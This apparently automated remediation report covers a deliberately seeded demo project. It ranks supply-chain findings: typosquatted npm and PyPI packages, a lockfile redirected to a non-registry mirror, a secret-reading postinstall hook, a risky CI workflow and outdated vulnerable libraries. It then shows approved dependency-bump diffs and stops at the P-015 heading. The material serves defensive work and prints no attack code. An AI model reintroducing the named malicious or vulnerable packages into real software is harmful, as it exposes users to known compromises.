# Guardian remediation report: sscg-demo-target

*Run `9318e5fb7ab5` · 2026-11-24T06:29:57+00:00 · AI engine deepseek:deepseek-flash*

**Prioritized risk → Recommended fix → Human approval → Build & test → Rescan → Verified remediation**

## 1. Summary

- **Verdict:** **VERIFIED** (confidence high)
  - all 26 targeted finding(s) resolved (their advisories are gone from every version of the package), no new Critical/High advisories, every approved fix was installed, built, started or tested (build, compile, image, install, smoke passed)
  - 2 other finding(s), not targeted by an approved fix, moved to a new version that keeps the same advisories (still open): F-036 org.apache.commons:commons-lang3@3.11 (GHSA-j288-q9x7-2f5v); F-038 org.apache.logging.log4j:log4j-api@2.14.1 (GHSA-qv9r-c865-cp47)
  - 2 package(s) moved to a version with other (not Critical/High) advisories: org.apache.logging.log4j:log4j-api@2.25.4, org.apache.commons:commons-lang3@3.12.0
  - built image scanned (debian 13.7, 260 packages): 0 critical / 58 high / 112 medium OS and package vulnerabilities (no baseline image to compare: the unchanged image did not build)
- **Measured (rescan):** 41 findings before → 15 after · resolved 28 · new 4 · by level before/after: Critical 21→3, High 8→4, Medium 12→8, Low 0→0
- **Proposals:** 20 · approved 16 · needs changes 4
- **Validated patch:** `remediation.patch` (sha256 `f85378b9caf21429…`, validated 2026-11-24T11:59:57+0530): the exact change that was built and rescanned, including regenerated lockfiles

## 2. Prioritized risks

*Initial risk + signed points for exploitability (CISA KEV, EPSS), static reachability, exposure indicators and the triage verdict. Deterministic: the same input gives the same order. Confidence drops for every missing or weak signal.*

| Priority | Score | Finding | Component | Why | Confidence |
|---|---|---|---|---|---|
| P0 URGENT | 14.5 | F-007 org.apache.logging.log4j:log4j-core@2.14.1: 8 known vulnerabilities (highest CRITICAL,… | org.apache.logging.log4j:log4j-core@2.14.1 | listed in CISA KEV: exploited in the wild, used in ransomware (+2.5); EPSS 1.000 for CVE-2021-45105 (100% percentile) (+1); imported by application code: potentially reachable (notifier/src/main/java/com/acme/Notifier.java:2,… | high |
| P0 URGENT | 10.0 | F-004 crossenv@7.0.3 is a documented malicious package | crossenv@7.0.3 | install-time risk: runs on every install, whether or not code imports it | high |
| P0 URGENT | 10.0 | F-005 lodash@4.17.15: same version, different content hash (and source) in package-lock.json | lodash@4.17.15 | install-time risk: runs on every install, whether or not code imports it | high |
| P0 URGENT | 10.0 | F-006 python3-dateutil@2.8.1 is a documented malicious package | python3-dateutil@2.8.1 | install-time risk: runs on every install, whether or not code imports it | high |
| P0 | 10.8 | F-011 pyyaml@5.3.0: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8) | pyyaml@5.3.0 | EPSS 0.062 for CVE-2020-14343 (94% percentile); imported by application code: potentially reachable (worker/app.py:3) (+0.5); production dependency; network-service indicators in the app (src/index.js:12 (Node HTTP server), Dockerfile:… | high |
| P0 | 10.5 | F-001 'postinstall' script scripts/setup.js runs shell commands / child processes, reads… | - | install-time risk: runs on every install, whether or not code imports it; triage: suspicious, high confidence (AI inference) (+0.5) | high |
| P1 | 10.3 | F-009 minimist@0.0.8: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8) | minimist@0.0.8 | EPSS 0.046 for CVE-2021-44906 (92% percentile); pulled in by an imported dependency: potentially reachable; production dependency; network-service indicators in the app (src/index.js:12 (Node HTTP server), Dockerfile: EXPOSE 3000) (+0.5) | high |
| P1 | 10.3 | F-010 org.apache.commons:commons-text@1.9: 1 known vulnerability (highest CRITICAL, CVSS 9.8) | org.apache.commons:commons-text@1.9 | EPSS 0.999 for CVE-2022-42889 (100% percentile) (+1); no import found in application code (static check; it may still be loaded dynamically or by build tools) (-1); production dependency; network-service indicators in the app… | high |
| P1 | 10.1 | F-023 axios@0.21.0: 25 known vulnerabilities (highest HIGH, CVSS 8.6) | axios@0.21.0 | EPSS 0.123 for CVE-2026-44492 (96% percentile) (+0.5); imported by application code: potentially reachable (src/index.js:4) (+0.5); production dependency; network-service indicators in the app (src/index.js:12 (Node HTTP server),… | high |
| P1 | 10.0 | F-002 .github/workflows/ci.yml: 'pull_request_target' workflow checks out the pull request's… | - |  | high |
| P1 | 10.0 | F-003 .github/workflows/ci.yml: secret(s) NPM_TOKEN are passed to a downloaded script | - |  | high |
| P1 | 10.0 | F-012 'crossenv' looks like the popular package 'cross-env' | crossenv@7.0.3 | install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, high confidence (AI inference) (+1) | high |
| P1 | 10.0 | F-013 'python3-dateutil' looks like the popular package 'python-dateutil' | python3-dateutil@2.8.1 | install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, high confidence (AI inference) (+1) | high |
| P1 | 10.0 | F-021 lodash@4.17.15: lockfile entry changed (resolved, integrity) but package.json still asks… | lodash@4.17.15 | install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, high confidence (AI inference) (+1) | high |
| P1 | 9.8 | F-008 com.fasterxml.jackson.core:jackson-databind@2.9.8: 60 known vulnerabilities (highest… | com.fasterxml.jackson.core:jackson-databind@2.9.8 | EPSS 0.452 for CVE-2019-12384 (99% percentile) (+0.5); no import found in application code (static check; it may still be loaded dynamically or by build tools) (-1); production dependency; network-service indicators in the app… | high |
| P1 | 9.6 | F-024 jinja2@2.10.0: 6 known vulnerabilities (highest HIGH, CVSS 8.6) | jinja2@2.10.0 | EPSS 0.036 for CVE-2019-10906 (90% percentile); imported by application code: potentially reachable (worker/app.py:4) (+0.5); production dependency; network-service indicators in the app (src/index.js:12 (Node HTTP server), Dockerfile:… | high |
| P1 | 9.6 | F-025 lodash@4.17.15: 5 known vulnerabilities (highest HIGH, CVSS 8.1) | lodash@4.17.15 | EPSS 0.202 for CVE-2021-23337 (98% percentile) (+0.5); imported by application code: potentially reachable (src/index.js:3) (+0.5); production dependency; network-service indicators in the app (src/index.js:12 (Node HTTP server),… | high |
| P1 | 9.5 | F-018 first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e ("chore:… | - | triage: suspicious, medium confidence (AI inference) (+0.5) | high |
| P1 | 9.5 | F-019 image fastbuilds42/node:latest is not an official / verified-publisher image… | fastbuilds42/node:latest | triage: suspicious, high confidence (AI inference) (+0.5) | high |
| P1 | 9.5 | F-020 lodash@4.17.15 is downloaded from npm-mirror.example.invalid, not the npm registry | lodash@4.17.15 | install-time risk: runs on every install, whether or not code imports it; triage: suspicious, high confidence (AI inference) (+0.5) | high |
| | | *21 more in remediation.json* | | | |

## 3. Recommended fixes and decisions

*The diff under each proposal is what the reviewer approved (manifest and file edits). Lockfiles are regenerated from the official registry during validation; the validated patch (section 4) contains them.*

### P-001 · APPROVED · upgrade · org.apache.logging.log4j:log4j-core@2.14.1

- **Findings:** F-007 org.apache.logging.log4j:log4j-core@2.14.1: 8 known vulnerabilities (highest CRITICAL, CVSS 10.0)
- **Change:** 2.14.1 → 2.25.4 in `notifier/pom.xml`
- **Why (verified facts):** Upgrade org.apache.logging.log4j:log4j-core 2.14.1 -> 2.25.4: fixes the 8 published advisories on 2.14.1; no known advisories remain on the target.
- **Advisor (AI inference):** P-001 upgrades org.apache.logging.log4j:log4j-core from 2.14.1 to 2.25.4 to resolve F-007, which reports 8 known vulnerabilities on the current version with a highest severity of CRITICAL (CVSS 10.0); the packet records residual_status "checked" with no residual advisories on the target. The trade-off is a minor version change (2.14.1 -> 2.25.4) classified as medium compatibility risk, so logging behavior and any API usage in notifier/pom.xml should be validated. The edit is limited to the log4j.version property in notifier/pom.xml and is reversible by reverting the remediation commit.
- **Reviewer checklist (AI inference):** Confirm the build of the notifier module resolves log4j-core 2.25.4 and that no other dependency pins 2.14.1 back in. · Run the notifier's test suite and a startup smoke test to catch medium-risk minor-version behavior changes in logging configuration. · Verify the rollback path: the remediation commit can be reverted to restore 2.14.1 in notifier/pom.xml and the lockfile if needed.
- **Expected risk reduction (estimate before validation):** expected: the 8 advisories of 2.14.1 are fixed in 2.25.4; 0 other advisory(ies) on 2.25.4 · targets 1 finding(s)
- **Compatibility:** medium: minor version change (2.14.1 -> 2.25.4)
- **Rollback:** restore org.apache.logging.log4j:log4j-core 2.14.1 in notifier/pom.xml (and the lockfile) by reverting the remediation commit
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `acbabb048694…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: built

```diff
--- a/notifier/pom.xml
+++ b/notifier/pom.xml
@@ -11,7 +11,7 @@
   <properties>
     <maven.compiler.source>11</maven.compiler.source>
     <maven.compiler.target>11</maven.compiler.target>
-    <log4j.version>2.14.1</log4j.version>
+    <log4j.version>2.25.4</log4j.version>
   </properties>
 
   <dependencies>
```

### P-002 · APPROVED · replace · crossenv@7.0.3

- **Findings:** F-004 crossenv@7.0.3 is a documented malicious package; F-012 'crossenv' looks like the popular package 'cross-env'; F-033 new dev dependency crossenv@7.0.3 added in package.json; F-041 crossenv@7.0.3 runs an install script (code not inspected)
- **Change:** 7.0.3 → cross-env@10.1.0 in `package.json`
- **Why (verified facts):** crossenv@7.0.3 is a documented malicious package of 'cross-env'; replace it with cross-env@10.1.0.
- **Advisor (AI inference):** P-002 replaces crossenv@7.0.3 with cross-env@10.1.0 because F-004 identifies the installed package as a documented malicious package, with F-012 flagging it as a typosquat of cross-env, F-033 noting it was unexpectedly added as a dev dependency, and F-041 noting an uninspected install script. Compatibility risk is low per the packet since crossenv is not imported by application code, and residual_status is "checked" with no residual advisories on the replacement. The package-lock.json is regenerated from the registry during validation, which also removes the malicious resolved entry.
- **Reviewer checklist (AI inference):** Confirm package.json no longer lists crossenv and that package-lock.json contains no crossenv entry or its registry artifacts. · Check whether any npm scripts or CI config invoke `crossenv` by name and update them to `cross-env`. · Do not roll back to the removed package; if the build breaks, treat it as a replacement issue and revert only the replacement change.
- **Expected risk reduction (estimate before validation):** removes the malicious / typosquatted package and its install-time code; resolves 4 finding(s)
- **Compatibility:** low: crossenv is not imported by application code
- **Rollback:** do NOT roll back to the removed package; revert only if the replacement breaks the build
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `865859792de0…`)
- **Validation (measured):** resolved (4/4 targeted findings resolved) · execution: built and started (the container answered)

```diff
--- a/package.json
+++ b/package.json
@@ -15,6 +15,6 @@
   },
   "license": "MIT",
   "devDependencies": {
-    "crossenv": "7.0.3"
+    "cross-env": "^10.1.0"
   }
 }
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

### P-003 · APPROVED · upgrade · lodash@4.17.15

- **Findings:** F-005 lodash@4.17.15: same version, different content hash (and source) in package-lock.json; F-020 lodash@4.17.15 is downloaded from npm-mirror.example.invalid, not the npm registry; F-021 lodash@4.17.15: lockfile entry changed (resolved, integrity) but package.json still asks for '4.17.15'; F-025 lodash@4.17.15: 5 known vulnerabilities (highest HIGH, CVSS 8.1)
- **Change:** 4.17.15 → 4.18.1 in `package.json`
- **Why (verified facts):** Upgrade lodash 4.17.15 -> 4.18.1: fixes the 5 published advisories on 4.17.15; no known advisories remain on the target. Regenerating the lockfile from the official registry also undoes the lockfile tampering.
- **Advisor (AI inference):** P-003 upgrades lodash from 4.17.15 to 4.18.1, addressing both the integrity findings (F-005 content-hash/source mismatch, F-020 download from npm-mirror.example.invalid, F-021 lockfile entry changed while package.json still pins 4.17.15) and the vulnerability finding F-025 (5 known advisories, highest HIGH at CVSS 8.1). Regenerating package-lock.json from the official registry during validation also undoes the lockfile tampering, and residual_status is "checked" with no residual advisories on the target. The trade-off is a medium-risk minor version change (4.17.15 -> 4.18.1) that warrants running tests.
- **Reviewer checklist (AI inference):** Confirm the regenerated package-lock.json resolves lodash 4.18.1 from the official npm registry with a valid integrity hash, and that no npm-mirror.example.invalid entries remain. · Run the test suite to cover the medium-risk minor version bump, watching for lodash API behavior changes. · Verify no other dependency transitively pins lodash back to 4.17.15 or reintroduces the modified lockfile entry.
- **Expected risk reduction (estimate before validation):** expected: the 5 advisories of 4.17.15 are fixed in 4.18.1; 0 other advisory(ies) on 4.18.1 · targets 4 finding(s)
- **Compatibility:** medium: minor version change (4.17.15 -> 4.18.1)
- **Rollback:** restore lodash 4.17.15 in package.json (and the lockfile) by reverting the remediation commit
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `c5a3e6faf125…`)
- **Validation (measured):** resolved (4/4 targeted findings resolved) · execution: built and started (the container answered)

```diff
--- a/package.json
+++ b/package.json
@@ -9,7 +9,7 @@
   },
   "dependencies": {
     "axios": "0.21.0",
-    "lodash": "4.17.15",
+    "lodash": "4.18.1",
     "mkdirp": "0.5.1",
     "node-fetch": "2.6.0"
   },
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

### P-004 · APPROVED · replace · python3-dateutil@2.8.1

- **Findings:** F-006 python3-dateutil@2.8.1 is a documented malicious package; F-013 'python3-dateutil' looks like the popular package 'python-dateutil'; F-034 new prod dependency python3-dateutil@2.8.1 added in worker/requirements.txt
- **Change:** 2.8.1 → python-dateutil@4.0.0 in `worker/requirements.txt`
- **Why (verified facts):** python3-dateutil@2.8.1 is a documented malicious package of 'python-dateutil'; replace it with python-dateutil@4.0.0.
- **Advisor (AI inference):** P-004 replaces python3-dateutil@2.8.1 with python-dateutil@4.0.0 because F-006 identifies the installed package as a documented malicious package, F-013 flags it as a typosquat of python-dateutil, and F-034 notes it was unexpectedly added as a production dependency in worker/requirements.txt. Compatibility risk is low per the packet since python3-dateutil is not imported by application code, and residual_status is "checked" with no residual advisories on the replacement. The change is a single requirements.txt line edit, and the removed malicious package must not be restored.
- **Reviewer checklist (AI inference):** Confirm worker/requirements.txt no longer references python3-dateutil and the worker environment is rebuilt from the updated file. · Check application imports for `dateutil`/`python3_dateutil` usage and confirm python-dateutil 4.0.0 satisfies any real import before deploying. · Do not roll back to the removed package; if the worker build breaks, revert only the replacement change after review.
- **Expected risk reduction (estimate before validation):** removes the malicious / typosquatted package and its install-time code; resolves 3 finding(s)
- **Compatibility:** low: python3-dateutil is not imported by application code
- **Rollback:** do NOT roll back to the removed package; revert only if the replacement breaks the build
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `e74af6046169…`)
- **Validation (measured):** resolved (3/3 targeted findings resolved) · execution: built

```diff
--- a/worker/requirements.txt
+++ b/worker/requirements.txt
@@ -1,5 +1,5 @@
 requests==2.19.1
 PyYAML==5.3
 Jinja2==2.10
-python3-dateutil==2.8.1
+python-dateutil==4.0.0
 urllib3
```

### P-005 · APPROVED · upgrade · pyyaml@5.3.0

- **Findings:** F-011 pyyaml@5.3.0: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)
- **Change:** 5.3.0 → 6.0.1 in `worker/requirements.txt`
- **Why (verified facts):** Pin pyyaml 5.3.0 -> 6.0.1: fixes the 2 published advisories on 5.3.0; no known advisories remain on the target.
- **Advisor (AI inference):** P-005 pins pyyaml from 5.3.0 to 6.0.1 to resolve F-011, which reports 2 known vulnerabilities with a highest severity of CRITICAL (CVSS 9.8); residual_status is "checked" with no residual advisories on the target. The packet classifies this as a high-risk major version change (5.3.0 -> 6.0.1) with possible breaking API changes, so this is the key trade-off even though the proposal is not marked urgent. The edit is confined to worker/requirements.txt and can be reverted via the remediation commit.
- **Reviewer checklist (AI inference):** Run the worker's test suite and any YAML-parsing code paths against PyYAML 6.0.1, since the packet flags possible breaking API changes in this major version bump. · Check that the installed environment no longer has PyYAML 5.3 and that no other requirements file pins it back. · Confirm the rollback path restores PyYAML==5.3 in worker/requirements.txt and the lockfile if the major upgrade cannot be validated.
- **Expected risk reduction (estimate before validation):** expected: the 2 advisories of 5.3.0 are fixed in 6.0.1; 0 other advisory(ies) on 6.0.1 · targets 1 finding(s)
- **Compatibility:** high: major version change (5.3.0 -> 6.0.1): breaking API changes are possible, run the tests
- **Rollback:** restore pyyaml 5.3.0 in worker/requirements.txt (and the lockfile) by reverting the remediation commit
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `5ed44ae4dbe9…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: built

```diff
--- a/worker/requirements.txt
+++ b/worker/requirements.txt
@@ -1,5 +1,5 @@
 requests==2.19.1
-PyYAML==5.3
+PyYAML==6.0.1
 Jinja2==2.10
 python3-dateutil==2.8.1
 urllib3
```

### P-006 · APPROVED · block · package.json scripts.postinstall

- **Findings:** F-001 'postinstall' script scripts/setup.js runs shell commands / child processes, reads secrets from the environment, hides data with base64, fingerprints the host / user; F-031 acme-orders@1.0.0 runs a 'postinstall' script on every install: node scripts/setup.js
- **Change:** - → - in `package.json`
- **Why (verified facts):** Remove the 'postinstall' hook from package.json: it runs code that reads secrets on every install (including CI). Review and delete the script file it calls.
- **Advisor (AI inference):** P-006 removes the scripts.postinstall hook (`node scripts/setup.js`) from package.json because F-001 reports the script runs shell commands/child processes, reads secrets from the environment, and hides data with base64, and F-031 notes it executes on every install including CI. The trade-off is medium compatibility: anything the postinstall step legitimately prepared must now be done explicitly, and the planner also advises reviewing and deleting the script file it calls. Residual_status is "checked" with no residual advisories recorded, and the change is reversible by restoring scripts.postinstall after a security review.
- **Reviewer checklist (AI inference):** Confirm package.json no longer defines scripts.postinstall and that scripts/setup.js is reviewed and deleted or neutralized. · Search CI/CD and developer setup docs for steps that relied on the postinstall hook and replace them with an explicit, reviewed command. · Verify no secrets were exposed by prior installs of acme-orders@1.0.0 and rotate any environment credentials the script could have read.
- **Expected risk reduction (estimate before validation):** stops install-time code execution; resolves 2 finding(s)
- **Compatibility:** medium: anything the 'postinstall' step legitimately prepared must now be done explicitly
- **Rollback:** restore scripts.postinstall in package.json after a security review
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `30df58cfc69c…`)
- **Validation (measured):** resolved (2/2 targeted findings resolved) · execution: built and started (the container answered)

```diff
--- a/package.json
+++ b/package.json
@@ -4,8 +4,7 @@
   "description": "Order API (SSCG demo target - do not install)",
   "main": "src/index.js",
   "scripts": {
-    "start": "node src/index.js",
-    "postinstall": "node scripts/setup.js"
+    "start": "node src/index.js"
   },
   "dependencies": {
     "axios": "0.21.0",
```

### P-007 · APPROVED · upgrade · minimist@0.0.8

- **Findings:** F-009 minimist@0.0.8: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)
- **Change:** 0.0.8 → 0.2.4 in `package.json`
- **Why (verified facts):** Override the transitive copies minimist 0.0.8 -> 0.2.4: fixes the 2 published advisories on 0.0.8; no known advisories remain on the target.
- **Advisor (AI inference):** F-009 reports two published advisories (highest CRITICAL, CVSS 9.8) on the transitive minimist 0.0.8, so P-007 adds an npm override to force resolution to 0.2.4; the packet's residual check shows no known advisories remain on the target. The trade-off is a minor-version bump (0.0.8 -> 0.2.4, medium compatibility) applied globally to every transitive consumer, which could affect argument-parsing edge cases in any of them.
- **Reviewer checklist (AI inference):** Confirm the regenerated package-lock.json resolves minimist to 0.2.4 everywhere and no remaining path still installs 0.0.8. · Run the test suite of every package that consumes minimist transitively, focusing on CLI argument parsing. · Verify the "overrides" block in package.json is the only change and can be reverted cleanly per the stated rollback.
- **Expected risk reduction (estimate before validation):** expected: the 2 advisories of 0.0.8 are fixed in 0.2.4; 0 other advisory(ies) on 0.2.4 · targets 1 finding(s)
- **Compatibility:** medium: minor version change (0.0.8 -> 0.2.4)
- **Rollback:** restore minimist 0.0.8 in package.json (and the lockfile) by reverting the remediation commit
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `23e75a8d2b65…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: built and started (the container answered)

```diff
--- a/package.json
+++ b/package.json
@@ -16,5 +16,8 @@
   "license": "MIT",
   "devDependencies": {
     "crossenv": "7.0.3"
+  },
+  "overrides": {
+    "minimist": "0.2.4"
   }
 }
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

### P-008 · APPROVED · upgrade · org.apache.commons:commons-text@1.9

- **Findings:** F-010 org.apache.commons:commons-text@1.9: 1 known vulnerability (highest CRITICAL, CVSS 9.8)
- **Change:** 1.9 → 1.10.0 in `notifier/pom.xml`
- **Why (verified facts):** Upgrade org.apache.commons:commons-text 1.9 -> 1.10.0: fixes the 1 published advisories on 1.9; no known advisories remain on the target.
- **Advisor (AI inference):** F-010 flags one CRITICAL (CVSS 9.8) advisory on the direct dependency commons-text 1.9, and P-008 raises it to 1.10.0 in notifier/pom.xml, with the packet reporting no known advisories left on the target. It is a minor-version change rated medium compatibility, so the trade-off is a small chance of behavioral differences in string utility APIs used by the notifier.
- **Reviewer checklist (AI inference):** Build and test the notifier module to confirm nothing depends on commons-text 1.9 behavior. · Check that the dependency tree shows 1.10.0 resolved and no other module pulls commons-text 1.9. · Review the one-line version edit in notifier/pom.xml before approving the commit.
- **Expected risk reduction (estimate before validation):** expected: the 1 advisories of 1.9 are fixed in 1.10.0; 0 other advisory(ies) on 1.10.0 · targets 1 finding(s)
- **Compatibility:** medium: minor version change (1.9 -> 1.10.0)
- **Rollback:** restore org.apache.commons:commons-text 1.9 in notifier/pom.xml (and the lockfile) by reverting the remediation commit
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `5d0af73c5a17…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: built

```diff
--- a/notifier/pom.xml
+++ b/notifier/pom.xml
@@ -23,7 +23,7 @@
     <dependency>
       <groupId>org.apache.commons</groupId>
       <artifactId>commons-text</artifactId>
-      <version>1.9</version>
+      <version>1.10.0</version>
     </dependency>
     <dependency>
       <groupId>com.fasterxml.jackson.core</groupId>
```

### P-009 · APPROVED · upgrade · axios@0.21.0

- **Findings:** F-023 axios@0.21.0: 25 known vulnerabilities (highest HIGH, CVSS 8.6)
- **Change:** 0.21.0 → 0.34.0 in `package.json`
- **Why (verified facts):** Upgrade axios 0.21.0 -> 0.34.0: fixes the 25 published advisories on 0.21.0; no known advisories remain on the target.
- **Advisor (AI inference):** F-023 lists 25 known advisories (highest HIGH, CVSS 8.6) on the direct dependency axios 0.21.0, and P-009 updates package.json to 0.34.0 with no known advisories remaining on the target per the packet. The change is rated medium compatibility with a lockfile regeneration, so the main trade-off is possible differences in HTTP client behavior (interceptors, error shapes) across the version jump.
- **Reviewer checklist (AI inference):** Run integration tests covering axios request/response handling, interceptors and error paths. · Confirm the regenerated package-lock.json pins axios 0.34.0 and that no other dependency forces 0.21.0. · Spot-check the package.json diff before committing to ensure the version is the only dependency change.
- **Expected risk reduction (estimate before validation):** expected: the 25 advisories of 0.21.0 are fixed in 0.34.0; 0 other advisory(ies) on 0.34.0 · targets 1 finding(s)
- **Compatibility:** medium: minor version change (0.21.0 -> 0.34.0)
- **Rollback:** restore axios 0.21.0 in package.json (and the lockfile) by reverting the remediation commit
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `ebaeb6280fa6…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: built and started (the container answered)

```diff
--- a/package.json
+++ b/package.json
@@ -8,7 +8,7 @@
     "postinstall": "node scripts/setup.js"
   },
   "dependencies": {
-    "axios": "0.21.0",
+    "axios": "0.34.0",
     "lodash": "4.17.15",
     "mkdirp": "0.5.1",
     "node-fetch": "2.6.0"
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

### P-010 · NEEDS CHANGES · escalate review · .github/workflows/ci.yml

- **Findings:** F-002 .github/workflows/ci.yml: 'pull_request_target' workflow checks out the pull request's own code
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** Do not check out the pull request's code in a pull_request_target workflow; use the pull_request trigger, or split into an unprivileged build and a privileged workflow_run.
- **Expected risk reduction (estimate before validation):** -
- **Compatibility:** low: -
- **Rollback:** -
- **Notes:** use pull_request instead, or never check out PR head in pull_request_target
- **Decision:** request_changes by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `63bf468bd15d…`)

### P-011 · NEEDS CHANGES · escalate review · .github/workflows/ci.yml

- **Findings:** F-003 .github/workflows/ci.yml: secret(s) NPM_TOKEN are passed to a downloaded script
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** Stop passing the secret to downloaded / mutable code (see the related proposals) and rotate the secret: it may already be exposed.
- **Expected risk reduction (estimate before validation):** -
- **Compatibility:** low: -
- **Rollback:** -
- **Notes:** pin the action / verify the script; rotate the secret if the workflow has run
- **Decision:** request_changes by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `a04bdb375420…`)

### P-012 · APPROVED · upgrade · com.fasterxml.jackson.core:jackson-databind@2.9.8

- **Findings:** F-008 com.fasterxml.jackson.core:jackson-databind@2.9.8: 60 known vulnerabilities (highest CRITICAL, CVSS 9.8)
- **Change:** 2.9.8 → 2.18.11 in `notifier/pom.xml`
- **Why (verified facts):** Upgrade com.fasterxml.jackson.core:jackson-databind 2.9.8 -> 2.18.11: fixes the 60 published advisories on 2.9.8; no known advisories remain on the target.
- **Advisor (AI inference):** F-008 reports 60 known advisories (highest CRITICAL, CVSS 9.8) on the direct dependency jackson-databind 2.9.8, so P-012 moves notifier/pom.xml to 2.18.11, with the packet's residual check showing no known advisories on the target. This is rated medium compatibility; the trade-off is that serialization/deserialization behavior and the surrounding Jackson dependency set may need attention after such a large version gap.
- **Reviewer checklist (AI inference):** Run notifier tests that exercise JSON serialization and deserialization, including any custom modules or annotations. · Verify the resolved dependency tree shows jackson-databind 2.18.11 and that no other artifact pulls 2.9.8. · Review the single version edit in notifier/pom.xml and confirm the build resolves cleanly before merge.
- **Expected risk reduction (estimate before validation):** expected: the 60 advisories of 2.9.8 are fixed in 2.18.11; 0 other advisory(ies) on 2.18.11 · targets 1 finding(s)
- **Compatibility:** medium: minor version change (2.9.8 -> 2.18.11)
- **Rollback:** restore com.fasterxml.jackson.core:jackson-databind 2.9.8 in notifier/pom.xml (and the lockfile) by reverting the remediation commit
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `576e75551444…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: built

```diff
--- a/notifier/pom.xml
+++ b/notifier/pom.xml
@@ -28,7 +28,7 @@
     <dependency>
       <groupId>com.fasterxml.jackson.core</groupId>
       <artifactId>jackson-databind</artifactId>
-      <version>2.9.8</version>
+      <version>2.18.11</version>
     </dependency>
   </dependencies>
 </project>
```

### P-013 · APPROVED · upgrade · jinja2@2.10.0

- **Findings:** F-024 jinja2@2.10.0: 6 known vulnerabilities (highest HIGH, CVSS 8.6)
- **Change:** 2.10.0 → 3.1.6 in `worker/requirements.txt`
- **Why (verified facts):** Pin jinja2 2.10.0 -> 3.1.6: fixes the 6 published advisories on 2.10.0; no known advisories remain on the target.
- **Advisor (AI inference):** F-024 reports six known advisories (highest HIGH, CVSS 8.6) on jinja2 2.10.0, and P-013 pins worker/requirements.txt to 3.1.6, with the packet showing no known advisories remaining on the target. The planner rates this high compatibility risk because it is a major version change (2.10.0 -> 3.1.6), so the trade-off is real potential for breaking template API behavior that must be caught by tests.
- **Reviewer checklist (AI inference):** Run the full worker test suite and exercise all templates, since major-version template API removals or behavior changes are possible. · Check template rendering behavior around autoescaping and undefined-variable handling. · Confirm the requirements lockfile resolves Jinja2 to 3.1.6 and that no other package constrains it to the 2.x line.
- **Expected risk reduction (estimate before validation):** expected: the 6 advisories of 2.10.0 are fixed in 3.1.6; 0 other advisory(ies) on 3.1.6 · targets 1 finding(s)
- **Compatibility:** high: major version change (2.10.0 -> 3.1.6): breaking API changes are possible, run the tests
- **Rollback:** restore jinja2 2.10.0 in worker/requirements.txt (and the lockfile) by reverting the remediation commit
- **Decision:** approve by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `5d36c0b224b8…`)
- **Validation (measured):** resolved (1/1 targeted findings resolved) · execution: built

```diff
--- a/worker/requirements.txt
+++ b/worker/requirements.txt
@@ -1,5 +1,5 @@
 requests==2.19.1
 PyYAML==5.3
-Jinja2==2.10
+Jinja2==3.1.6
 python3-dateutil==2.8.1
 urllib3
```

### P-014 · NEEDS CHANGES · escalate review · 

- **Findings:** F-018 first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e ("chore: routine dependency refresh")
- **Change:** - → -
- **Why (verified facts):** first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e ("chore: routine dependency refresh"). Require a second reviewer for build and dependency files from this author; the other proposals address the concrete changes.
- **Expected risk reduction (estimate before validation):** -
- **Compatibility:** low: -
- **Rollback:** -
- **Notes:** process change, nothing to patch
- **Decision:** request_changes by Ghanashyam (demo approver) at 2026-11-24T06:28:57+00:00: Approve all patchable fixes; CI workflow and new-contributor issues need a security reviewer (proposal sha256 `fcc266cb4507…`)

### P-015 · APPROVED · update base image · fastbuilds42/node:latest

